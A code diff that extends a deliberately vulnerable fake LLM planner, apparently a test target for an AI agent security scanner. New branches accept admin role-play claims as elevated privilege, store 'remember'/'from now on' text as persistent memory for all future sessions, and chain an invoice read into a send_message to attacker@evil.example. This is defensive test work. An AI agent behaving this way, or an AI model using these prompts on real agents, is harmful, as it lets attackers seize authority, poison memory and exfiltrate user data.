@@ -301,7 +301,79 @@ def _fake_llm_planner(message: str) -> tuple[str, list[dict]]:
 
     Vulnerable by design: any instruction mentioning cancel/delete on a
     subscription wins, regardless of authority or system prompt.
+
+    Also carries several "novel" vulnerabilities that AgentShield's
+    static rule pack doesn't cover (yet) — authority escalation via
+    role-play, memory poisoning, multi-tool chaining. The exploratory
+    probe finds these by brainstorming attacks against the agent's
+    manifest rather than mapping from a known static finding.
     """
+    # Authority escalation — accepts "as an admin" / "I was promoted"
+    # framings as proof of elevated privilege. Not a static-rule pattern
+    # in the current pack; an exploratory probe would find it.
+    if re.search(
+        r"\bas\s+an?\s+(admin|administrator|superuser|root|sysadmin)"
+        r"|\bI\s+(was\s+|have\s+been\s+)?promoted"
+        r"|\bI\s+have\s+admin(istrative)?\s+privileges?",
+        message,
+        re.IGNORECASE,
+    ):
+        return (
+            "Acknowledged — operating in admin mode.",
+            [{
+                "name": "elevate_session",
+                "args": {"role": "admin"},
+                "admin_authority_assumed": True,
+                "admin_mode_unlocked": True,
+            }],
+        )
+
+    # Memory poisoning — accepts "remember:" / "save to memory:" /
+    # "from now on" framings and reports the "stored" instruction.
+    # Agentic T1 (memory poisoning) is a narrative-only rule today —
+    # no probe surface for it.
+    poison_match = re.search(
+        r"(?:remember|save\s+to\s+memory|from\s+now\s+on|"
+        r"add\s+to\s+memory)[:\s]+(.{10,200})",
+        message,
+        re.IGNORECASE | re.DOTALL,
+    )
+    if poison_match:
+        instruction = poison_match.group(1).strip().strip("\"'.")
+        return (
+            "Saved to long-term memory.",
+            [{
+                "name": "memory_write",
+                "args": {"key": "persistent_directive", "value": instruction[:160]},
+                "memory_state": {
+                    "saved": True,
+                    "persistent": True,
+                    "applies_to": "all_future_sessions",
+                },
+            }],
+        )
+
+    # Multi-tool chaining — single message that requests both a read and
+    # a write tool. The agent obeys both in one turn, with no per-tool
+    # consent check. Not a static-rule pattern.
+    if re.search(
+        r"(list|fetch|get|read|retrieve)\b.{0,80}\b(and|then|,)\b"
+        r".{0,80}\b(send|post|publish|email|forward|push)\b",
+        message,
+        re.IGNORECASE,
+    ):
+        return (
+            "Calling read + write tools in sequence.",
+            [
+                {"name": "list_invoices", "args": {}},
+                {
+                    "name": "send_message",
+                    "args": {"to": "attacker@evil.example", "body": "<list_invoices output>"},
+                    "tool_chain": ["list_invoices", "send_message"],
+                    "chained_without_policy_check": True,
+                },
+            ],
+        )
     calls: list[dict] = []
     # Match both the natural-language form ("cancel subscription 999")
     # AND the function-call form ("call cancel_subscription on 999")
